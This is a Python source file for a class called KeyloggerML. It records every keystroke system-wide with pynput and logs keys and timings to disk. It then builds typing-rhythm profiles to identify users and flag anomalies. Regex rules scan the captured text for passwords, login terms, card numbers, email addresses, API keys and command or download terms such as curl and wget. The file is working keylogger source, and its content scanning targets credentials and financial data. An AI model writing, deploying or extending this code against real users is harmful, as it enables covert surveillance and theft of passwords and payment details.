import numpy as np
import pandas as pd
from sklearn.cluster import KMeans
from sklearn.ensemble import IsolationForest
from sklearn.preprocessing import StandardScaler
import time
import json
from datetime import datetime
import os
import re
from pynput.keyboard import Key, Listener

class KeyloggerML:
    def __init__(self, log_file="keylog.txt", session_dir="sessions"):
        self.log_file = log_file
        self.session_dir = session_dir
        self.typing_patterns = []
        self.user_profiles = {}
        self.current_session = {"keystrokes": [], "timestamps": [], "key_hold_times": []}
        self.current_key = None
        self.current_timestamp = None
        self.is_running = False
        
        # Create session directory if it doesn't exist
        os.makedirs(self.session_dir, exist_ok=True)
        
    def extract_features(self, raw_data):
        """Extract features from keystroke data"""
        # Example features:
        # - Average typing speed (characters per minute)
        # - Typing rhythm patterns
        # - Common key sequences
        # - Key hold duration
        features = {}
        
        if len(raw_data["timestamps"]) < 2:
            return None
            
        # Calculate typing speed
        total_time = raw_data["timestamps"][-1] - raw_data["timestamps"][0]
        char_count = len(raw_data["keystrokes"])
        if total_time > 0:
            features["typing_speed"] = (char_count / total_time) * 60
        else:
            features["typing_speed"] = 0
            
        # Calculate rhythm patterns (time between keystrokes)
        intervals = [raw_data["timestamps"][i+1] - raw_data["timestamps"][i] 
                    for i in range(len(raw_data["timestamps"])-1)]
        features["avg_interval"] = np.mean(intervals) if intervals else 0
        features["std_interval"] = np.std(intervals) if intervals else 0
        
        # Key hold duration
        features["avg_key_hold"] = np.mean(raw_data["key_hold_times"]) if raw_data["key_hold_times"] else 0
        features["std_key_hold"] = np.std(raw_data["key_hold_times"]) if raw_data["key_hold_times"] else 0
        
        # Calculate frequency of special keys
        text = ''.join(str(k) for k in raw_data["keystrokes"])
        features["special_key_ratio"] = sum(1 for c in text if not c.isalnum()) / max(len(text), 1)
        
        # Calculate backspace usage
        backspace_count = sum(1 for k in raw_data["keystrokes"] if k == Key.backspace)
        features["backspace_ratio"] = backspace_count / max(len(raw_data["keystrokes"]), 1)
        
        return features
        
    def preprocess_log(self):
        """Process the raw keylog file into structured data"""
        try:
            with open(self.log_file, 'r') as f:
                lines = f.readlines()
                
            keystrokes = []
            timestamps = []
            key_hold_times = []
            
            for line in lines:
                if '|' in line:
                    parts = line.strip().split('|')
                    if len(parts) >= 3:
                        key = parts[0]
                        timestamp = float(parts[1])
                        hold_time = float(parts[2])
                        
                        keystrokes.append(key)
                        timestamps.append(timestamp)
                        key_hold_times.append(hold_time)
            
            structured_data = {
                "keystrokes": keystrokes,
                "timestamps": timestamps,
                "key_hold_times": key_hold_times
            }
            
            return structured_data
        except Exception as e:
            print(f"Error processing log: {e}")
            return {
                "keystrokes": [],
                "timestamps": [],
                "key_hold_times": []
            }
    
    def detect_anomalies(self, new_data):
        """Detect if keystroke pattern deviates from the normal profile"""
        if len(self.typing_patterns) < 10:
            print("Not enough data to establish a baseline pattern")
            return False
            
        # Convert typing patterns to a numpy array for model input
        X = np.array(self.typing_patterns)
        scaler = StandardScaler()
        X_scaled = scaler.fit_transform(X)
        
        # Train isolation forest for anomaly detection
        model = IsolationForest(contamination=0.05, random_state=42)
        model.fit(X_scaled)
        
        # Extract features from new data
        new_features = self.extract_features(new_data)
        if new_features is None:
            return False
            
        # Convert to proper format for prediction
        new_features_array = np.array([[
            new_features["typing_speed"],
            new_features["avg_interval"],
            new_features["std_interval"],
            new_features["avg_key_hold"],
            new_features["std_key_hold"],
            new_features["special_key_ratio"],
            new_features["backspace_ratio"]
        ]])
        
        # Scale the new data using the same scaler
        new_features_scaled = scaler.transform(new_features_array)
        
        # Predict if it's an anomaly
        prediction = model.predict(new_features_scaled)
        
        # Calculate anomaly score
        anomaly_score = model.decision_function(new_features_scaled)[0]
        print(f"Anomaly score: {anomaly_score:.4f}")
        
        # Return True if anomaly detected (prediction is -1)
        return prediction[0] == -1
    
    def identify_user(self, typing_data):
        """Attempt to identify the user based on typing patterns"""
        if len(self.user_profiles) < 2:
            print("Need at least two user profiles for identification")
            return None
            
        features = self.extract_features(typing_data)
        if features is None:
            return None
            
        min_distance = float('inf')
        identified_user = None
        confidence_scores = {}
        
        # Distance-based identification with confidence scoring
        for user, profile in self.user_profiles.items():
            distance = sum((features[key] - profile[key])**2 
                          for key in features if key in profile)
            
            confidence_scores[user] = 1.0 / (1.0 + distance)
            
            if distance < min_distance:
                min_distance = distance
                identified_user = user
        
        # Normalize confidence scores
        total_confidence = sum(confidence_scores.values())
        if total_confidence > 0:
            for user in confidence_scores:
                confidence_scores[user] /= total_confidence
                
            print(f"User identification confidence: {confidence_scores}")
            
            # Only identify if confidence is high enough
            top_confidence = confidence_scores[identified_user]
            if top_confidence < 0.5:
                return None
                
        return identified_user
    
    def add_user_profile(self, user_id, typing_data=None):
        """Add or update a user profile based on typing data"""
        if typing_data is None:
            typing_data = self.current_session
            
        features = self.extract_features(typing_data)
        if features:
            # If user already exists, perform weighted update
            if user_id in self.user_profiles:
                alpha = 0.8  # Weight for existing profile
                for key in features:
                    if key in self.user_profiles[user_id]:
                        self.user_profiles[user_id][key] = (
                            alpha * self.user_profiles[user_id][key] + 
                            (1 - alpha) * features[key]
                        )
                    else:
                        self.user_profiles[user_id][key] = features[key]
            else:
                self.user_profiles[user_id] = features
                
            print(f"Profile updated for user {user_id}")
            
            # Save user profiles
            self.save_user_profiles()
    
    def save_user_profiles(self):
        """Save user profiles to a file"""
        with open(os.path.join(self.session_dir, "user_profiles.json"), 'w') as f:
            json.dump(self.user_profiles, f)
            
    def load_user_profiles(self):
        """Load user profiles from a file"""
        try:
            profile_path = os.path.join(self.session_dir, "user_profiles.json")
            if os.path.exists(profile_path):
                with open(profile_path, 'r') as f:
                    self.user_profiles = json.load(f)
                print(f"Loaded {len(self.user_profiles)} user profiles")
        except Exception as e:
            print(f"Error loading user profiles: {e}")
    
    def analyze_command_patterns(self, text):
        """Identify potential command patterns or sensitive information"""
        command_patterns = {
            "login": r"login|signin|username|password",
            "financial": r"credit.*card|bank|account.*number|\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}",
            "cmd_exec": r"cmd\.exe|powershell|bash|sudo|\.exe|\.sh",
            "data_exfil": r"ftp|curl|wget|upload|download|\.zip|\.tar|\.gz",
            "email": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
            "api_key": r"key-[a-zA-Z0-9]{32}|[a-zA-Z0-9]{32}",
        }
        
        results = {}
        for category, pattern in command_patterns.items():
            if re.search(pattern, text, re.IGNORECASE):
                results[category] = True
        
        return results
        
    def on_key_press(self, key):
        """Record key press with timestamp"""
        try:
            self.current_key = key
            self.current_timestamp = time.time()
            
            # Convert key to string representation
            key_char = self._format_key(key)
            
            # Store in current session
            self.current_session["keystrokes"].append(key)
            self.current_session["timestamps"].append(self.current_timestamp)
            
            # Log to file
            with open(self.log_file, "a") as f:
                f.write(f"{key_char}|{self.current_timestamp}|")
        except Exception as e:
            print(f"Error in key press handler: {e}")
    
    def on_key_release(self, key):
        """Record key release for hold time calculation"""
        try:
            if self.current_key == key and self.current_timestamp is not None:
                release_timestamp = time.time()
                hold_time = release_timestamp - self.current_timestamp
                
                # Store hold time
                self.current_session["key_hold_times"].append(hold_time)
                
                # Update log file with hold time
                with open(self.log_file, "a") as f:
                    f.write(f"{hold_time:.6f}\n")
                
                # Check if we should run analysis
                if len(self.current_session["keystrokes"]) % 100 == 0:
                    self.run_analysis()
                    
                # Stop listener if Key.esc pressed (configurable)
                if key == Key.f12:  # F12 to exit
                    self.stop()
                    return False
        except Exception as e:
            print(f"Error in key release handler: {e}")
    
    def _format_key(self, key):
        """Convert key to a string representation"""
        try:
            # Handle special keys
            if hasattr(key, 'char') and key.char:
                return key.char
            else:
                return str(key).replace("Key.", "")
        except:
            return str(key)
    
    def run_analysis(self):
        """Main method to run analysis on collected data"""
        if len(self.current_session["keystrokes"]) < 10:
            return
            
        features = self.extract_features(self.current_session)
        
        if features:
            # Update typing patterns
            self.typing_patterns.append([
                features["typing_speed"],
                features["avg_interval"],
                features["std_interval"],
                features["avg_key_hold"],
                features["std_key_hold"],
                features["special_key_ratio"],
                features["backspace_ratio"]
            ])
            
            # Check for anomalies
            if self.detect_anomalies(self.current_session):
                print("⚠️ Anomaly detected in typing pattern!")
                
            # Try to identify user
            user = self.identify_user(self.current_session)
            if user:
                print(f"Identified user: {user}")
                
            # Analyze content for sensitive patterns
            text = ''.join(str(k) for k in self.current_session["keystrokes"] 
                          if hasattr(k, 'char') and k.char)
            patterns = self.analyze_command_patterns(text)
            if patterns:
                print(f"Detected patterns: {patterns}")
                
            # Save session data periodically
            if len(self.current_session["keystrokes"]) % 500 == 0:
                self.save_session_data()
    
    def save_session_data(self):
        """Save the session data for later analysis"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(self.session_dir, f"session_{timestamp}.json")
        
        # Convert keys to serializable format
        serializable_keystrokes = [self._format_key(k) for k in self.current_session["keystrokes"]]
        
        with open(filename, 'w') as f:
            json.dump({
                "typing_patterns": self.typing_patterns,
                "session_data": {
                    "keystrokes": serializable_keystrokes,
                    "timestamps": self.current_session["timestamps"],
                    "key_hold_times": self.current_session["key_hold_times"]
                }
            }, f)
        
        print(f"Session data saved to {filename}")
    
    def start(self):
        """Start the keylogger"""
        if self.is_running:
            print("Keylogger is already running")
            return
            
        self.is_running = True
        
        # Load existing user profiles
        self.load_user_profiles()
        
        # Start the listener
        self.listener = Listener(
            on_press=self.on_key_press,
            on_release=self.on_key_release
        )
        
        print("Keylogger started. Press F12 to exit.")
        self.listener.start()
    
    def stop(self):
        """Stop the keylogger"""
        if not self.is_running:
            return
            
        self.is_running = False
        
        # Save final session data
        self.save_session_data()
        
        # Save user profiles
        self.save_user_profiles()
        
        try:
            self.listener.stop()
        except:
            pass
            
        print("Keylogger stopped")

# Example usage
if __name__ == "__main__":
    ml_analyzer = KeyloggerML()
    
    # Option 1: Analyze existing log
    if os.path.exists(ml_analyzer.log_file) and os.path.getsize(ml_analyzer.log_file) > 0:
        print("Analyzing existing log file...")
        structured_data = ml_analyzer.preprocess_log()
        ml_analyzer.current_session = structured_data
        ml_analyzer.run_analysis()
    
    # Option 2: Start fresh keylogging session
    ml_analyzer.start()
    
    # Keep the program running
    try:
        while ml_analyzer.is_running:
            time.sleep(1)
    except KeyboardInterrupt:
        ml_analyzer.stop()
